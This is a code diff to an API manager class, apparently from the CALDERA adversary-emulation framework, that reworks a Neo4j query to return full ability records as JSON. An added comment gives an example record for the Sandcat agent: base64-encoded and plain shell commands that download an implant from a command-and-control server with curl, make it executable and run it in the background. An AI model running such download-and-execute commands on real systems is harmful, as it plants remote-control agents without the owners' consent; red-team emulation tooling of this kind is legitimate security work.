@@ -2,6 +2,7 @@ import logging
 import os
 import uuid
 import yaml
+import json
 
 from marshmallow.schema import SchemaMeta
 from typing import Any, List
@@ -69,17 +70,40 @@ class BaseApiManager(BaseWorld):
                 # if search:
                     # conditions = [f"ram_key.{key} = '{value}'" for key, value in search.items()]
                     # query += " WHERE " + " AND ".join(conditions)
-                query += " RETURN node.name"
+                query += " RETURN node"
 
                 print(" find_and_dump_objects: query: %s"%query)
 
                 # execute query
                 result = session.run(query)
                 # Retrieve the values from the result
-                values = [record["node.name"] for record in result]
-                print("result: %s"%result)
-                print("values: %s"%values)
-                result = session.run(query)
+                # values = [record["node.name"] for record in result]
+                # print("values: %s"%values)
+                formatted_nodes = []
+                for record in result:
+                    node = record["node"]
+                    print(node)
+                    formatted_node = {
+                        "requirements": node.get("requirements", []),
+                        "delete_payload": node.get("delete_payload", False),
+                        "technique_id": node.get("technique_id", ""),
+                        "additional_info": node.get("additional_info", {}),
+                        "buckets": node.get("buckets", []),
+                        "executors": node.get("executors", []),
+                        "plugin": node.get("plugin", ""),
+                        "description": node.get("description", ""),
+                        "privilege": node.get("privilege", ""),
+                        "tactic": node.get("tactic", ""),
+                        "ability_id": node.get("ability_id", ""),
+                        "singleton": node.get("singleton", False),
+                        "technique_name": node.get("technique_name", ""),
+                        "name": node.get("name", ""),
+                        "repeatable": node.get("repeatable", False),
+                        "access": node.get("access", {})
+                    }
+                    json_data = json.dumps(formatted_node)
+                    formatted_nodes.append(json_data)
+            
 
                 # Needs to be updated to work with neo4j
                 # matched_objs = [record['n'] for record in result]
@@ -87,12 +111,74 @@ class BaseApiManager(BaseWorld):
                 # sorted_objs = sorted(dumped_objs, key=lambda p: p.get(sort, 0))
                 # default_value = self._data_svc.get_config(f"objects.{ram_key}.default")
                 # sorted_objs.sort(key=lambda x: 0 if x.get(sort) == default_value else 1)
-
                 # return sorted_objs
-                return values
+                
+                # Example obj in dumped_objs: 
+                # {
+                #     "requirements": [],
+                #     "delete_payload": true,
+                #     "technique_id": "T1105",
+                #     "additional_info": {},
+                #     "buckets": [
+                #       "command-and-control"
+                #     ],
+                #     "executors": [
+                #       {
+                #         "additional_info": {},
+                #         "language": null,
+                #         "parsers": [],
+                #         "build_target": null,
+                #         "variations": [
+                #           {
+                #             "description": "Deploy as a blue-team agent instead of red",
+                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgLWdyb3VwIGJsdWUgJg=="
+                #           },
+                #           {
+                #             "description": "Download with a random name and start as a background process",
+                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgJg=="
+                #           },
+                #           {
+                #             "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang).",
+                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6I3thZ2VudC5leHRlbnNpb25zfSIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLXY="
+                #           },
+                #           {
+                #             "description": "Download with GIST C2",
+                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6Z2lzdCIgLUggImMyOmdpc3QiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLWMyIEdJU1QgLXY="
+                #           },
+                #           {
+                #             "description": "Deploy as a P2P agent with known peers included in compiled agent",
+                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6cHJveHlfaHR0cCIgLUggImluY2x1ZGVQcm94eVBlZXJzOkhUVFAiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLXNlcnZlciAkc2VydmVyIC1saXN0ZW5QMlAgLXY="
+                #           }
+                #         ],
+                #         "code": null,
+                #         "cleanup": [],
+                #         "payloads": [],
+                #         "timeout": 60,
+                #         "platform": "darwin",
+                #         "name": "sh",
+                #         "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -v",
+                #         "uploads": []
+                #       }
+                #     ],
+                #     "plugin": "sandcat",
+                #     "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.",
+                #     "privilege": "",
+                #     "tactic": "command-and-control",
+                #     "ability_id": "2f34977d-9558-4c12-abad-349716777c6b",
+                #     "singleton": false,
+                #     "technique_name": "Ingress Tool Transfer",
+                #     "name": "Sandcat",
+                #     "repeatable": false,
+                #     "access": {}
+                #   }
+                print("formatted_nodes: %s"%formatted_nodes)
+                return formatted_nodes
         except Exception as e:
             self.log.error('[!] Error finding and dumping objects: %s' % e)
             return []
+        finally:
+            if session is not None:
+                session.close()
 
     @staticmethod
     def dump_object_with_filters(obj: Any, include: List[str] = None, exclude: List[str] = None) -> dict:
